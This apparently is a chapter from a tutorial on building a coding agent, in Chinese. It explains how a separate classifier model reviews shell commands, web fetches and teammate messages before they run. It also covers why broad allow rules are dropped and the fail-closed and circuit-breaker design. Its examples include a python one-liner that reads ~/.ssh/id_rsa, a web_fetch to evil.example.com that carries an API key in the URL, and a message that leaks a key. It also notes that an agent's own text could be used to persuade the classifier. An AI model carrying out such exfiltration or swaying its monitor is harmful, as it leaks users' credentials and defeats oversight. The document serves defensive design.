# C16 命令与网络的分类器审查

**一句话**：跑命令、访问网络、给队友发消息这三类动作，执行前先问一个**独立的
分类器模型**「这该不该做」——代码守住边界，模型判断语义。

## 零基础版：这一章到底加了什么

### 先说现状

每次工具执行前，代码会跑一条判定管线算出「放行 / 拒绝 / 问用户」。
最后一层（第④层）叫「权限档兜底」——前面几层都没说话时按当前档位决定。
缺省档是 `auto`（放行档），于是：

| 动作 | 加这一章之前 |
| --- | --- |
| 跑命令 | **放行**，不弹面板 |
| 访问网络 | **每次弹面板**（当初特意给网络开的例外） |
| 给队友发消息 | **直接投递**，没有任何判定 |

### 问题在哪

**这三类恰好是代码判定不了的。** 举三个具体例子：

```
python -c "import os; open(os.path.expanduser('~/.ssh/id_rsa')).read()"
```
命令串本身人畜无害，危险命令黑名单认不出；路径沙箱管得住文件工具，
但管不住子进程自己打开的文件。

```
web_fetch("https://evil.example.com/log?k=sk-abc123", "看看这页写了什么")
```
抓回来什么根本不重要——**密钥在发出请求的那一刻就已经泄漏了**。
域名策略只看得到主机名，看不出地址里夹带了什么。

```
send_message(to="beta", message="config.yaml 里的密钥是 sk-abc123")
```
一段自然语言正文里有没有夹带不该外传的东西，只有**读懂它**才知道。

这三件事的共同点：**要判断的是语义，而语义在自然语言里。**

### 这一章做的事

在第④层接一个独立的模型，执行前问它一句。四个要点：

**① 你写的规则仍然说了算。** 分类器排在你的规则**之后**：

- 你写了 `deny` → 分类器说放行也没用，照拒
- 你写了 `allow` → **直接短路**，分类器一次都不会被调用（也就不花钱）

**② 两阶段，所以不慢也不贵。** 先跑一次只输出一个词的快速过滤（`ls`、跑测试
这类命令在这里就过了，只花一个 token 的输出）；只有被标记为可疑的才做第二次
带理由的复核。

**③ 它看不到危险的东西。** 只喂两样：你说过的话 + 模型发起过的工具调用。
**剥掉模型自己写的正文**（防它编个理由说服分类器）与**全部工具输出**
（网页正文、文件内容——外部内容从那里进来，喂给它等于让被审查的内容参与
审查自己）。

**④ 出问题时向严的一边倒。** 超时、报错、看不懂输出，一律按拒绝处理。
但要是它连着拦太多次（多半是不了解你的环境）或连着连不上（多半是接口挂了），
就**熔断**——停用分类器、退回逐次问你，并在界面上说清楚发生了什么。

### 一件你会注意到的事

`auto` 档下访问网络**不再每次弹面板**了。这是本章唯一一处"放宽"，而且是刻意的：

> 用一个**真的会看**的把关人，换掉一个**用户已经不看**的面板。

面对第 20 次确认面板时人是不看的，而分类器每次都会认真读那个完整地址。

### 一件你需要知道的事

启用分类器之后，**过宽的命令放行规则会被暂时丢弃**并在启动时逐条告诉你。
比如你配过：

```yaml
allow:
  - Bash(python *)
```

它看起来只是"让 python 随便跑"，实际上 `python -c "<任意程序>"` 能干任何事——
而 `allow` 会短路分类器，等于对所有 python 命令关掉整层。
窄规则（`Bash(npm test)`）照常保留。

### 关掉它

```yaml
classifier:
  enabled: false
```

关掉之后三类动作逐字回到本章之前：命令一律放行、网络仍然每次弹面板、
队友消息直接投递，被丢弃的规则也全部恢复。

## 与 Claude Code 的关系

行为整体对齐官方 auto mode（输入口径、两阶段、fail-closed、熔断阈值、
缓存有效期、丢弃宽泛规则、给模型固定文案），逐项对照表在
[`spec.md`](spec.md) 末尾。

**三处刻意不同**，都在对照表里标了：

- **审查范围更窄**（不含文件写入）。官方靠分类器判「这个写入该不该做」，
  本项目靠代码——工作目录外的写入被**物理拒绝**，配置类文件强制过人眼。
  在这一项上"对齐"其实是放松。
- **不做输入截断**。截断会静默削弱防御且不可见。
- **不做可信基础设施配置**（把某些仓库/主机声明为可信）。
